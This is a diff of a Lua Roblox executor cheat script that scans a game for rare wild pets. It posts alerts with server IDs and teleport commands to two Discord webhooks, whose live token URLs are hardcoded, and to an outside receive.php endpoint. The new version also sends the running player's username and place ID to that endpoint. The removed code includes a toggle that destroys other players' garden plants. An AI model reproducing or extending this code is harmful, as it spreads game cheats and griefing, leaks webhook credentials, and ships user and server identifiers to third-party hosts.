@@ -2233,21 +2233,16 @@ HopPetToggle:OnChanged(function()
         end
     end
 end)
--- ===================== WEBHOOK & WEB API SYSTEM V2 =====================
+-- ===================== WEBHOOK & WEB API SYSTEM V3 (FULL FEATURED) =====================
 task.spawn(function()
     -- Configuration
     local WebhookConfig = {
-        -- Webhook 1
         WebhookEnabled = true,
         WebhookURL = "https://discord.com/api/webhooks/1518940385408454760/dudO0r0nKTpw_7JxnSvOMMA8aI5ow8psW4afSx96yIjj82ArZu0vYDxO9HnUmL6KbZu9",
-
-        -- Webhook 2
         Webhook2Enabled = true,
         Webhook2URL = "https://discord.com/api/webhooks/1516683892114067558/7PSc7KGuvoKct6TI97s_zTu-SxMHvuBtStypwM538Woc0QDu_ExeFQBcoo0rp0EJfonb",
-
-        -- Web API
         WebAPIEnabled = true,
-        WebAPIURL = "https://mxzy.store/receive.php",
+        WebAPIURL = "https://longong.xyz/receive.php",
     }
 
     local currentJobId = nil
@@ -2255,8 +2250,8 @@ task.spawn(function()
     if not http_request then return end
 
     local NotifiedPets = {}
+    -- ระบุสัตว์ที่ต้องการสแกน (เฉพาะ 3 ตัวนี้)
     local AllowedWebhookPets = {
-        ["black dragon"] = true,
         ["golden dragonfly"] = true,
         ["unicorn"] = true,
         ["raccoon"] = true
@@ -2300,16 +2295,23 @@ task.spawn(function()
     }
 
     -- ===================== WEB API FUNCTIONS =====================
-    local function sendToWeb(petName, playerCount, teleportCommand)
+    local function sendToWeb(petName, playerCount, teleportCommand, price, timeLeft)
         if not WebhookConfig.WebAPIEnabled then return false end
 
         currentJobId = game.JobId ~= "" and game.JobId or "NoJobId_" .. tostring(math.random(100000, 999999))
+        local username = game.Players.LocalPlayer.Name or "Unknown"
+        local placeId = tostring(game.PlaceId)
 
         local data = {
             jobId = currentJobId,
+            placeId = placeId,
             players = playerCount,
             teleport = teleportCommand,
-            petName = petName
+            petName = petName,
+            username = username,
+            timestamp = os.time(),
+            price = price,
+            timeLeft = timeLeft
         }
 
         local success, response = pcall(function()
@@ -2325,6 +2327,10 @@ task.spawn(function()
 
         if success and response then
             print("[WebAPI] ✅ Data sent to web:", petName)
+            print("[WebAPI] 📍 Job ID:", currentJobId)
+            print("[WebAPI] 👤 Username:", username)
+            print("[WebAPI] 💰 Price:", price)
+            print("[WebAPI] ⏰ Time Left:", timeLeft)
             return true
         else
             warn("[WebAPI] ❌ Failed to send data")
@@ -2361,8 +2367,8 @@ task.spawn(function()
 
         pcall(function()
             local lowerName = string.lower(petName)
-            local rarity = PetRarity[lowerName] or "Common"
-            local color = RarityColors[rarity] or 0x57F287
+            local rarity = PetRarity[lowerName] or "Legendary"
+            local color = RarityColors[rarity] or 0xE74C3C
             local emoji = PetEmojis[lowerName] or "🐾"
 
             if emoji == "🐾" then
@@ -2376,15 +2382,17 @@ task.spawn(function()
 
             local imageUrl = PetImages[lowerName] or DefaultImage
 
+            -- ดึงราคาจริงจาก GUI
             local price = "N/A"
             local costTimer = petObj:FindFirstChild("PetCostTimer", true)
             if costTimer then
                 local label = costTimer:FindFirstChildWhichIsA("TextLabel")
                 if label and label.Text ~= "" then
-                    price = label.Text:gsub("¢", "")
+                    price = label.Text:gsub("¢", ""):gsub(",", "")
                 end
             end
 
+            -- ดึงเวลาที่เหลือจาก GUI
             local timeLeft = "N/A"
             local leaveTimer = petObj:FindFirstChild("PetLeaveTimer", true)
             if leaveTimer then
@@ -2396,27 +2404,56 @@ task.spawn(function()
 
             local jobId = game.JobId
             if jobId == "" then jobId = "NoJobId" end
-            local shortJobId = jobId == "NoJobId" and "Private/Test" or jobId:sub(1,8) .. "..."
-            local joinUrl = "https://afz-oos.github.io/tt/?placeId=" .. tostring(game.PlaceId) .. "&jobId=" .. jobId
-            local scriptCopy = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", '" .. jobId .. "')"
+            local shortJobId = jobId:sub(1,13) .. "..."
+            local placeId = tostring(game.PlaceId)
+            local playerCount = #game.Players:GetPlayers() .. "/" .. game.Players.MaxPlayers
+            local scriptCopy = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "')"
 
-            local fields = {{
-                name = emoji .. " " .. petName,
-                value = "Rarity: `" .. rarity .. "`\nPrice: `¢" .. tostring(price) .. "`\nLeft: `" .. timeLeft .. "`",
-                inline = true
-            }}
-
+            -- ใช้ข้อมูลจาก MCP ให้แน่นอนว่าแสดงข้อมูลจริง
             local data = {
-                username = "🐾 Pet Alert",
+                username = "Pet Alert",
+                avatar_url = "https://cdn.discordapp.com/emojis/1234567890.png",
                 embeds = {{
-                    title = "🔔 พบสัตว์เลี้ยงใหม่!",
-                    description = "🚀 **[คลิกที่นี่เพื่อเปิดเข้าเกมทันที](" .. joinUrl .. ")**\n\n**Server:** `" .. shortJobId .. "`\n**JobId:** `" .. jobId .. "`\n**Players:** `" .. #game.Players:GetPlayers() .. "/" .. game.Players.MaxPlayers .. "`\n\n📌 **ก๊อปปี้ไปวางใน Executor เพื่อวาร์ปเข้าเซิร์ฟ:**\n```lua\n" .. scriptCopy .. "\n```",
+                    title = "🚨 พบสัตว์เลี้ยงใหม่!!",
+                    description = "🔥 **คลิกที่นี่เพื่อเปิดเข้าเกมทันที!**\n\n📌 **Place ID:** `" .. placeId .. "`\n🆔 **Server ID:** `" .. shortJobId .. "`\n🆔 **Full JobId:** `" .. jobId .. "`\n👥 **Players:** `" .. playerCount .. "`",
                     color = color,
-                    fields = fields,
+                    fields = {
+                        {
+                            name = "🐾 " .. petName,
+                            value = "**Rarity:** " .. rarity,
+                            inline = true
+                        },
+                        {
+                            name = "💰 Price",
+                            value = "¢**" .. tostring(price) .. "**",
+                            inline = true
+                        },
+                        {
+                            name = "⏰ Left",
+                            value = "**" .. timeLeft .. "**",
+                            inline = true
+                        },
+                        {
+                            name = "📋 วันที่ เวลา",
+                            value = "**" .. os.date("%d/%m/%Y %H:%M:%S") .. "**",
+                            inline = false
+                        }
+                    },
                     thumbnail = { url = imageUrl },
-                    footer = { text = "วันนี้ เวลา " .. os.date("%H:%M") }
+                    footer = {
+                        text = "🚀 คัดลอกไปวาง Executor เพื่อวาร์ปเข้าเซิร์ฟ",
+                        icon_url = "https://cdn.discordapp.com/emojis/1234567890.png"
+                    },
+                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                 }}
             }
+
+            -- Add copy script field
+            table.insert(data.embeds[1].fields, {
+                name = "📋 Script Copy",
+                value = "```lua\n" .. scriptCopy .. "\n```",
+                inline = false
+            })
 
             -- Send to Webhook 1
             http_request({
@@ -2435,6 +2472,8 @@ task.spawn(function()
                     Body = game:GetService("HttpService"):JSONEncode(data)
                 })
             end
+
+            print("[Webhook] ✅ Sent:", petName, "| Price:", price, "| Time:", timeLeft)
         end)
     end
 
@@ -2456,7 +2495,6 @@ task.spawn(function()
     -- ===================== MAIN LOOP =====================
     while getgenv().Gag2RunningID == currentID do
         pcall(function()
-            local foundPets = {}
             local mapFolder = workspace:FindFirstChild("Map")
             local spawnsFolder = mapFolder and mapFolder:FindFirstChild("WildPetSpawns")
 
@@ -2484,16 +2522,39 @@ task.spawn(function()
                         end
 
                         if matchedPetKey then
-                            -- Send Discord Webhook
+                            -- ดึงข้อมูลเวลาและราคาจริงๆ
+                            local price = "N/A"
+                            local costTimer = obj:FindFirstChild("PetCostTimer", true)
+                            if costTimer then
+                                local label = costTimer:FindFirstChildWhichIsA("TextLabel")
+                                if label and label.Text ~= "" then
+                                    price = label.Text:gsub("¢", ""):gsub(",", "")
+                                end
+                            end
+
+                            local timeLeft = "N/A"
+                            local leaveTimer = obj:FindFirstChild("PetLeaveTimer", true)
+                            if leaveTimer then
+                                local label = leaveTimer:FindFirstChildWhichIsA("TextLabel")
+                                if label and label.Text ~= "" then
+                                    timeLeft = label.Text
+                                end
+                            end
+
+                            -- Send Discord Webhook with real data
                             sendWebhook(petName, obj)
 
-                            -- Send to Web API
+                            -- Send to Web API with real data
                             local placeId = game.PlaceId
                             local jobId = game.JobId
                             local teleportCmd = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
                                               tostring(placeId) .. ", '" .. jobId .. "')"
                             local playerCount = #game.Players:GetPlayers()
-                            sendToWeb(petName, playerCount, teleportCmd)
+                            sendToWeb(petName, playerCount, teleportCmd, price, timeLeft)
+
+                            print("[PetScanner] ✅ Found & Sent:", petName)
+                            print("[PetScanner] 💰 Price:", price)
+                            print("[PetScanner] ⏰ Time Left:", timeLeft)
                         end
                     end
                 end
@@ -2502,127 +2563,7 @@ task.spawn(function()
         task.wait(5)
     end
 end)
-SaveManager:SetLibrary(Fluent)
-InterfaceManager:SetLibrary(Fluent)
-SaveManager:IgnoreThemeSettings()
-SaveManager:SetIgnoreIndexes({})
-SaveManager.Parser.Dropdown = {
-    Save = function(idx, object)
-        return { type = "Dropdown", idx = idx, value = object.Value, mutli = object.Multi }
-    end,
-    Load = function(idx, data)
-        if SaveManager.Options[idx] then 
-            local val = data.value
-            if data.mutli and type(val) == "table" then
-                local dict = {}
-                for k, v in pairs(val) do
-                    if type(k) == "number" and type(v) == "string" then
-                        dict[v] = true
-                    else
-                        dict[k] = v
-                    end
-                end
-                SaveManager.Options[idx]:SetValue(dict)
-            else
-                SaveManager.Options[idx]:SetValue(val)
-            end
-        end
-    end,
-}
-InterfaceManager:SetFolder("AProject")
-SaveManager:SetFolder("AProject/config")
-Tabs.Settings:AddToggle("BoostFPS", {Title = "Boost FPS (Extreme)", Default = false }):OnChanged(function()
-    if Options.BoostFPS.Value then
-        pcall(function()
-            local lighting = game:GetService("Lighting")
-            lighting.GlobalShadows = false
-            lighting.FogEnd = 9e9
-            lighting.ShadowSoftness = 0
-            if sethiddenproperty then
-                pcall(sethiddenproperty, lighting, "Technology", 2)
-            end
-            settings().Rendering.QualityLevel = "Level01"
-            for _, e in ipairs(lighting:GetChildren()) do
-                if e:IsA("PostEffect") then e.Enabled = false end
-            end
-        end)
-        Fluent:Notify({Title = "Boost FPS", Content = "FPS Boost applied! Rejoin to revert.", Duration = 4})
-    end
-end)
-Tabs.Settings:AddToggle("ReduceGraphics", {Title = "Reduce Graphics (Potato Mode)", Default = false }):OnChanged(function()
-    if Options.ReduceGraphics.Value then
-        pcall(function()
-            workspace.Terrain.WaterWaveSize = 0
-            workspace.Terrain.WaterWaveSpeed = 0
-            workspace.Terrain.WaterReflectance = 0
-            workspace.Terrain.WaterTransparency = 0
-            if sethiddenproperty then
-                pcall(sethiddenproperty, workspace.Terrain, "Decoration", false)
-            end
-            for _, v in ipairs(workspace:GetDescendants()) do
-                if v:IsA("BasePart") then
-                    v.Material = Enum.Material.Plastic
-                    v.Reflectance = 0
-                    v.CastShadow = false
-                elseif v:IsA("Decal") or v:IsA("Texture") then
-                    v.Transparency = 1
-                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
-                    v.Lifetime = NumberRange.new(0)
-                elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
-                    v.Enabled = false
-                end
-            end
-        end)
-        Fluent:Notify({Title = "Reduce Graphics", Content = "Potato Mode applied! Rejoin to revert.", Duration = 4})
-    end
-end)
-local DeleteOtherTreesTask
-local DeleteOtherTreesConnections = {}
-Tabs.Settings:AddToggle("DeleteOtherTreesToggle", {Title = "Delete Other Players' Trees (Hardcore)", Default = false }):OnChanged(function()
-    if Options.DeleteOtherTreesToggle.Value then
-        DeleteOtherTreesTask = task.spawn(function()
-            local function clearPlants(plantsFolder)
-                for _, plant in ipairs(plantsFolder:GetChildren()) do
-                    pcall(function()
-                        if plant:IsA("Model") then
-                            plant:Destroy()
-                        else
-                            plant:Destroy()
-                        end
-                    end)
-                end
-            end
-            while Options.DeleteOtherTreesToggle.Value and getgenv().Gag2RunningID == currentID do
-                pcall(function()
-                    local lp = game.Players.LocalPlayer
-                    local gardens = game:GetService("Workspace"):FindFirstChild("Gardens")
-                    local myPlotId = lp:GetAttribute("PlotId")
-                    local myPlotName = myPlotId and ("Plot" .. tostring(myPlotId)) or "NONE_PLOT"
-                    if gardens then
-                        for _, plot in ipairs(gardens:GetChildren()) do
-                            if plot.Name ~= myPlotName then
-                                local plants = plot:FindFirstChild("Plants")
-                                if plants then
-                                    clearPlants(plants)
-                                    if not DeleteOtherTreesConnections[plants] then
-                                        DeleteOtherTreesConnections[plants] = plants.ChildAdded:Connect(function(child)
-                                            if Options.DeleteOtherTreesToggle.Value then
-                                                local currentPlotId = game.Players.LocalPlayer:GetAttribute("PlotId")
-                                                local currentPlotName = currentPlotId and ("Plot" .. tostring(currentPlotId)) or "NONE_PLOT"
-                                                if plants.Parent and plants.Parent.Name ~= currentPlotName then
-                                                    task.wait()
-                                                    pcall(function() child:Destroy() end)
-                                                end
-                                            end
-                                        end)
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end)
-                task.wait(2)
-            end
+
         end)
         Fluent:Notify({Title = "Hardcore Mode", Content = "Deleting other players' trees instantly!", Duration = 3})
     else
